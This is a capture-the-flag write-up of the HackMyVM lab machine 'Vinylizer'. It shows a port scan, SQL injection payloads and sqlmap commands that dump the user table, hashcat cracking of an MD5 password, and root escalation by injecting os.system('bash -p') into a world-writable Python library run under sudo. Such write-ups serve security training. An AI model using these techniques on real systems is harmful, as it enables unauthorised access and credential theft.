
<h1 align="center"> Vinylizer-HMV: <a href="https://hackmyvm.eu/machines/machine.php?vm=VinylizerCoffeeShop">Vinylizer</a></h1/>

## Port Scan
Using an automate script lets port scan this vm

```zsh
hmv vinylizer
```
```
Checking and installing dependencies...
nmap is already installed.

Step 1: Discovering networks and selecting one...
Available networks:
1. Network: 192.168.1.1/24, Local IP: 192.168.1.2, Gateway IP: 192.168.1.1
2. Network: 192.168.56.1/24, Local IP: 192.168.56.1, Gateway IP: Not detected
Select the network to use (number):
....
```

```zsh
ip=192.168.56.3 && url=http://vinylizer.hmv && cd /home/cool/HMV/vinylizer && clear && cat nmapscans/nmap-vinylizer.log
```
```
Nmap scan report for vinylizer.hmv (192.168.56.3)
Host is up (0.000077s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f8:e3:79:35:12:8b:e7:41:d4:27:9d:97:a5:14:b6:16 (ECDSA)
|_  256 e3:8b:15:12:6b:ff:97:57:82:e5:20:58:2d:cb:55:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Vinyl Records Marketplace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```zsh 
brave $url
```

Found login section, 
tried a couple of logins without success,
Tried username test' and pass any
 
There it is sql injection

passed it to burp and saved 
```
POST /login.php HTTP/1.1
Host: vinylizer.hmv
Content-Length: 32
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://vinylizer.hmv
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.6
Referer: http://vinylizer.hmv/login.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=oof2nptufma.......ep
Connection: close

username=cool&password=ok&login=
```
## SQL MAP
```
sqlmap -r post.txt --threads 10 --dbs --level 5 --risk 3 --random-agent 
```
```
OST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 736 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
    Payload: username=cool' OR NOT 8596=8596-- yAJe&password=ok&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=cool' AND (SELECT 4771 FROM (SELECT(SLEEP(5)))etok)-- mhMD&password=ok&login=
---
[09:11:58] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[09:11:58] [INFO] fetching database names
[09:11:58] [INFO] fetching number of databases
[09:11:58] [INFO] retrieved: 3
[09:11:58] [INFO] retrieving the length of query output
[09:11:58] [INFO] retrieved: 18
[09:11:58] [INFO] retrieved: information_schema             
[09:11:58] [INFO] retrieving the length of query output
[09:11:58] [INFO] retrieved: 18
[09:11:58] [INFO] retrieved: performance_schema             
[09:11:58] [INFO] retrieving the length of query output
[09:11:58] [INFO] retrieved: 17
[09:11:59] [INFO] retrieved: vinyl_marketplace             
available databases [3]:
[*] information_schema
[*] performance_schema
[*] vinyl_marketplace

```

```
sqlmap -r post.txt --threads 10 --dbs --level 5 --risk 3 --random-agent --dump
```

```
09:14:01] [WARNING] no clear password(s) found                                                                                                                                       
Database: vinyl_marketplace
Table: users
[2 entries]
+----+----------------------------------+-----------+----------------+
| id | password                         | username  | login_attempts |
+----+----------------------------------+-----------+----------------+
| 1  | 9432522ed1a8fca612b11c3980a031f6 | shopadmin | 0              |
| 2  | password123                      | lana      | 0              |
+----+----------------------------------+-----------+----------------+

```
# Crack that md5

tried with john with no succeed

lets try hashcat
```zsh
hashcat -a 0 -m 0 shop.hash /usr/share/seclists/rockyou.txt 
```

```
hashcat (v6.2.6) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i5-1135G7 @ 2.40GHz, 2782/5629 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/seclists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 1 sec

9432522ed1a8fca612b11c3980a031f6:addicted2vinyl           
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 9432522ed1a8fca612b11c3980a031f6
Time.Started.....: Mon Mar 25 09:51:55 2024 (1 sec)
Time.Estimated...: Mon Mar 25 09:51:56 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/seclists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7931.8 kH/s (0.11ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10371072/14344384 (72.30%)
Rejected.........: 0/10371072 (0.00%)
Restore.Point....: 10366976/14344384 (72.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: adecko -> adamsyeera
Hardware.Mon.#1..: Temp: 73c Util: 35%

Started: Mon Mar 25 09:51:28 2024
Stopped: Mon Mar 25 09:51:58 2024
```

There it is : ```9432522ed1a8fca612b11c3980a031f6:addicted2vinyl```

```zsh
ssh shopadmin@$ip
```
```
shopadmin@vinylizer:~$ history 
    1  cd
    2  ls
    3  cat /usr/lib/python3.10/random.py
    4  ls
    5  ls -la
    6  rm -rf .bash_history 
    7  ls
    8  exit
```

hm whats that random.py and why he tried to remove history
```
shopadmin@vinylizer:~$ ls -alh /usr/lib/python3.10/random.py
-rwxrwxrwx 1 root root 33K Nov 20 15:14 /usr/lib/python3.10/random.py
```

Seems we got full control of random.py 

lets see what we can do with it

```
shopadmin@vinylizer:~$ sudo -l
Matching Defaults entries for shopadmin on vinylizer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User shopadmin may run the following commands on vinylizer:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 
```

```
shopadmin@vinylizer:~$ head /opt/vinylizer.py 
# @Name: Vinylizer
# @Author: MrMidnight
# @Version: 1.8

import json
import random

def load_albums(filename):
    try:
        with open(filename, 'r') as file:
```

import random

So we can exploit this random library

# Root time
```zsh
pico /usr/lib/python3.10/random.py
```
Add
```python
import os

os.system("bash -p")
```

```zsh
shopadmin@vinylizer:~$ sudo -u root /usr/bin/python3 /opt/vinylizer.py 
root@vinylizer:/home/shopadmin# 
```

